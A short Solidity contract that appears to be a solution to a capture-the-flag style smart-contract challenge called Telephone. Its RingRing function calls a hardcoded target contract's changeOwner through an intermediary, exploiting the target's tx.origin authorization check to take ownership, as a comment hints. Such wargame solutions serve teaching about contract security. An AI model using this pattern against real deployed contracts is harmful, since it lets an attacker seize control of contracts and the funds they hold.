// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import * as Telephone from "./Telephone.sol";


contract TelephoneSolution {

    address public telephoneAddress;

    constructor() {
        telephoneAddress = 0xF811eEd1Ada08c9E61d9956e72D27bd4753Ba860;
    }

     // using tx.origin in checks is not safe b/c a malicious contract 
    function RingRing() public {
        Telephone.Telephone telephoneContract = Telephone.Telephone(telephoneAddress);
        telephoneContract.changeOwner(msg.sender);
    }

}